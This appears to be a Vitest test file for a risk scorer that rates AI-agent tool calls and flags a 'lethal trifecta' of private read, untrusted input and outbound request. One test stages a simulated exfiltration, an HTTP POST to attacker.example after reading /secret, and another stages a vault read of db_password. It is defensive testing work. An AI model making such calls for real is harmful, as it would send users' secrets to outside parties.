import { describe, it, expect } from "vitest";
import { scoreRisk } from "../../src/risk/score.js";
import { classify } from "../../src/risk/classify.js";
import { TrifectaTracker } from "../../src/risk/trifecta.js";

const emptyTrifecta = {
  readPrivate: false,
  sawUntrusted: false,
  outboundAttempted: false,
  isLethal: false,
  reasons: [],
};

describe("scoreRisk", () => {
  it("plain filesystem read → low", () => {
    const c = classify({ name: "read_file", arguments: { path: "/x" } });
    const r = scoreRisk(c, emptyTrifecta);
    expect(r.risk).toBe("low");
  });

  it("payment → critical regardless of trifecta", () => {
    const c = classify({ name: "stripe_create_charge", arguments: { amount: 1 } });
    const r = scoreRisk(c, emptyTrifecta);
    expect(r.risk).toBe("critical");
    expect(r.reasons.join(" ")).toMatch(/payment/i);
  });

  it("shell execute → high", () => {
    const c = classify({ name: "shell_exec", arguments: { cmd: "ls" } });
    const r = scoreRisk(c, emptyTrifecta);
    expect(r.risk).toBe("high");
  });

  it("filesystem delete → high", () => {
    const c = classify({ name: "delete_file", arguments: { path: "/x" } });
    const r = scoreRisk(c, emptyTrifecta);
    expect(r.risk).toBe("high");
  });

  it("filesystem write → medium", () => {
    const c = classify({ name: "write_file", arguments: { path: "/x", content: "" } });
    const r = scoreRisk(c, emptyTrifecta);
    expect(r.risk).toBe("medium");
  });

  it("HTTP POST after private read + untrusted read → high (lethal trifecta → critical)", () => {
    const t = new TrifectaTracker();
    t.observe("s1", classify({ name: "read_file", arguments: { path: "/secret" } }));
    t.observe("s1", classify({ name: "fetch", arguments: { url: "https://news.example" } }));
    const outboundCall = classify({
      name: "http_post",
      arguments: { url: "https://attacker.example", body: { x: 1 } },
    });
    const snap = t.inspect("s1", outboundCall);
    const r = scoreRisk(outboundCall, snap);
    expect(r.risk).toBe("critical");
    expect(r.reasons.join(" ")).toMatch(/lethal trifecta|exfiltration/i);
  });

  it("HTTP POST without any prior session context → medium", () => {
    const c = classify({ name: "http_post", arguments: { url: "https://x.example" } });
    const r = scoreRisk(c, emptyTrifecta);
    expect(r.risk).toBe("medium");
  });

  it("HTTP POST after untrusted read (no private read yet) → high", () => {
    const t = new TrifectaTracker();
    t.observe("s1", classify({ name: "fetch", arguments: { url: "https://news.example" } }));
    const outboundCall = classify({ name: "http_post", arguments: { url: "https://x.example" } });
    const snap = t.inspect("s1", outboundCall);
    const r = scoreRisk(outboundCall, snap);
    expect(r.risk).toBe("high");
  });

  it("secret read after the session has attempted outbound → critical", () => {
    const t = new TrifectaTracker();
    t.observe("s1", classify({ name: "http_post", arguments: { url: "https://x" } }));
    const readSecret = classify({ name: "vault_read", arguments: { name: "db_password" } });
    const snap = t.inspect("s1", readSecret);
    const r = scoreRisk(readSecret, snap);
    expect(r.risk).toBe("critical");
  });

  it("reasons are non-empty for every score level", () => {
    const cases = [
      classify({ name: "read_file", arguments: { path: "/x" } }),
      classify({ name: "write_file", arguments: { path: "/x", content: "" } }),
      classify({ name: "delete_file", arguments: { path: "/x" } }),
      classify({ name: "stripe_create_charge", arguments: { amount: 1 } }),
    ];
    for (const c of cases) {
      const r = scoreRisk(c, emptyTrifecta);
      expect(r.reasons.length).toBeGreaterThan(0);
    }
  });
});
